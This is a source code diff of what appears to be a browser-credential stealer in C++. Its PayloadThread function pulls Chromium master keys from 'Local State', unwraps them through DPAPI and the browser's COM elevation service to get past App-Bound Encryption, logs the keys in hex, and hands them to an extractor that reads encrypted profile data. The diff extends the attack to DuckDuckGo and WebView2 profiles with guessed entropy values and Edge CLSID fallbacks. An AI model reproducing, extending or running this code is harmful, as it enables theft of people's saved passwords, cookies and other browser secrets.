@@ -103,7 +103,7 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                 browser.userDataPath = config.userDataPath;
             }
 
-            if (browser.name == "WebView2") {
+            if (browser.name == "DuckDuckGo" || browser.name == "WebView2") {
                 if (browser.userDataPath.filename() != "EBWebView") {
                     if (std::filesystem::exists(browser.userDataPath / "EBWebView")) {
                         browser.userDataPath /= "EBWebView";
@@ -120,28 +120,30 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                 pipe.LogDebug("Warning: Syscall initialization failed.");
             }
 
-            std::vector<uint8_t> masterKey;
-            std::vector<std::vector<uint8_t>> allKeys;
+            DataExtractor::MasterKeys mKeys;
 
             if (config.isGecko) {
-                DataExtractor extractor(pipe, allKeys, config.outputPath, true);
+                DataExtractor extractor(pipe, mKeys, config.outputPath, true);
                 // Gecko logic...
             } else {
                 // Chromium
                 std::string error;
-                auto encAbeKey = GetEncryptedKeyByName(localStatePath, "app_bound_encrypted_key", &error);
-                auto encDpapiKey = GetEncryptedKeyByName(localStatePath, "encrypted_key");
-
-                bool isSpecificBrowser = (browser.name == "DuckDuckGo" || browser.name == "WebView2");
+                auto encKey = GetEncryptedKeyByName(localStatePath, "app_bound_encrypted_key", &error);
+                
+                struct {
+                    std::vector<uint8_t> abe;
+                    std::vector<uint8_t> dpapi;
+                } masterKeys;
 
                 auto tryDpapi = [&]() {
-                    if (!encDpapiKey.empty()) {
+                    auto legacyKey = GetEncryptedKeyByName(localStatePath, "encrypted_key");
+                    if (!legacyKey.empty()) {
                         DATA_BLOB input, output;
                         size_t offset = 0;
-                        if (encDpapiKey.size() > 5 && memcmp(encDpapiKey.data(), "DPAPI", 5) == 0) offset = 5;
+                        if (legacyKey.size() > 5 && memcmp(legacyKey.data(), "DPAPI", 5) == 0) offset = 5;
 
-                        input.pbData = const_cast<BYTE*>(encDpapiKey.data() + offset);
-                        input.cbData = static_cast<DWORD>(encDpapiKey.size() - offset);
+                        input.pbData = const_cast<BYTE*>(legacyKey.data() + offset);
+                        input.cbData = static_cast<DWORD>(legacyKey.size() - offset);
 
                         std::vector<DWORD> flagsToTry = { 0, 0x40, 0x1, 0x4, 0x44 };
                         RevertToSelf();
@@ -149,7 +151,14 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                         std::vector<std::variant<std::string, std::wstring>> entropies = { 
                             L"", L"DuckDuckGo", L"Microsoft Edge",
                             browser.userDataPath.wstring(),
-                            browser.userDataPath.parent_path().wstring()
+                            browser.userDataPath.parent_path().wstring(),
+                            L"DuckDuckGo.DesktopBrowser_ya2fgkz3nks94",
+                            L"DuckDuckGo_ya2fgkz3nks94",
+                            L"EBWebView",
+                            L"User Data",
+                            L"Default",
+                            L"Profile 1",
+                            ""
                         };
 
                         for (auto flag : flagsToTry) {
@@ -169,11 +178,9 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                                     }
                                 }
                                 if (CryptUnprotectData(&input, nullptr, (entropy.pbData ? &entropy : nullptr), nullptr, nullptr, flag, &output)) {
-                                    std::vector<uint8_t> k(output.pbData, output.pbData + output.cbData);
+                                    masterKeys.dpapi.assign(output.pbData, output.pbData + output.cbData);
                                     LocalFree(output.pbData);
-                                    pipe.Log("KEY:DPAPI:" + KeyToHex(k));
-                                    allKeys.push_back(k);
-                                    if (masterKey.empty()) masterKey = k;
+                                    pipe.Log("KEY:DPAPI:" + KeyToHex(masterKeys.dpapi));
                                     return true;
                                 }
                             }
@@ -182,11 +189,10 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                     return false;
                 };
 
-                // Pro strategy: Try both, collect all.
-                if (isSpecificBrowser) tryDpapi();
+                tryDpapi();
 
-                if (!encAbeKey.empty()) {
-                    pipe.Log("[-] Attempting ABE decryption...");
+                if (!encKey.empty()) {
+                    pipe.Log("[-] Attempting ABE decryption (timeout 5s)...");
                     struct AbeParams {
                         std::vector<uint8_t> encKeyRaw;
                         BrowserConfig browser;
@@ -194,10 +200,10 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                         bool done = false;
                     } abeParams;
 
-                    if (encAbeKey.size() > 4 && memcmp(encAbeKey.data(), "APPB", 4) == 0) {
-                        abeParams.encKeyRaw.assign(encAbeKey.begin() + 4, encAbeKey.end());
+                    if (encKey.size() > 4 && memcmp(encKey.data(), "APPB", 4) == 0) {
+                        abeParams.encKeyRaw.assign(encKey.begin() + 4, encKey.end());
                     } else {
-                        abeParams.encKeyRaw = encAbeKey;
+                        abeParams.encKeyRaw = encKey;
                     }
                     abeParams.browser = browser;
 
@@ -205,7 +211,14 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                         auto p = static_cast<AbeParams*>(lp);
                         try {
                             Com::Elevator elevator;
-                            if (p->browser.name == "Edge") {
+                            std::vector<GUID> clsidList = { p->browser.clsid };
+                            // Fallback to Edge CLSIDs if this looks like a WebView2 browser (like DDG)
+                            if (p->browser.name == "DuckDuckGo" || p->browser.userDataPath.string().find("EBWebView") != std::string::npos) {
+                                clsidList.push_back({0xD09425E4, 0xA1FD, 0x4CCB, {0x97, 0x21, 0x39, 0xF2, 0x80, 0xA2, 0x87, 0x51}}); // Edge Stable
+                                clsidList.push_back({0x05307513, 0xDF72, 0x4B44, {0x88, 0x49, 0x06, 0x6E, 0x0A, 0x89, 0xAF, 0xBA}}); // Edge Beta
+                            }
+
+                            if (p->browser.name == "Edge" || p->browser.name == "DuckDuckGo") {
                                 std::vector<GUID> edgeClsids = {
                                     p->browser.clsid,
                                     {0xD09425E4, 0xA1FD, 0x4CCB, {0x97, 0x21, 0x39, 0xF2, 0x80, 0xA2, 0x87, 0x51}},
@@ -232,31 +245,30 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                     }
 
                     if (!abeParams.result.empty()) {
-                        pipe.Log("KEY:ABE:" + KeyToHex(abeParams.result));
-                        allKeys.push_back(abeParams.result);
-                        if (masterKey.empty()) masterKey = abeParams.result;
+                        masterKeys.abe = abeParams.result;
+                        pipe.Log("KEY:ABE:" + KeyToHex(masterKeys.abe));
                     }
                 }
 
-                if (!isSpecificBrowser) tryDpapi();
-                
-                if (allKeys.empty()) {
-                    pipe.Log("[!] Warning: No decryption keys found for this browser.");
+                if (masterKeys.abe.empty() && masterKeys.dpapi.empty()) {
+                    pipe.Log("[!] Master key decryption failed for both ABE and DPAPI.");
                 }
 
-                if (browser.name == "Edge" && !masterKey.empty()) {
+                if (browser.name == "Edge" && !masterKeys.abe.empty()) {
                     auto asterEncKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "aster_app_bound_encrypted_key");
                     if (!asterEncKey.empty()) {
                         try {
                             Com::Elevator elevator;
                             auto asterKey = elevator.DecryptKeyEdgeIID(asterEncKey, browser.clsid, browser.iid);
                             pipe.Log("ASTER_KEY:" + KeyToHex(asterKey));
-                            allKeys.push_back(asterKey);
                         } catch (...) {}
                     }
                 }
 
-                DataExtractor extractor(pipe, allKeys, config.outputPath, false);
+                DataExtractor::MasterKeys keys;
+                keys.abe = masterKeys.abe;
+                keys.dpapi = masterKeys.dpapi;
+                DataExtractor extractor(pipe, keys, config.outputPath, false);
                 pipe.Log("[-] Effective UserData: " + browser.userDataPath.string());
 
                 if (std::filesystem::exists(browser.userDataPath)) {
@@ -271,7 +283,7 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                                 if (hasHistory || hasEncrypted) {
                                     pipe.Log("[-] Found profile: " + entry.path().filename().string());
                                     extractor.ProcessUnencrypted(entry.path(), browser.name);
-                                    if (!masterKey.empty() && hasEncrypted) {
+                                    if ((!masterKeys.abe.empty() || !masterKeys.dpapi.empty()) && hasEncrypted) {
                                         extractor.ProcessProfile(entry.path(), browser.name);
                                     }
                                 }
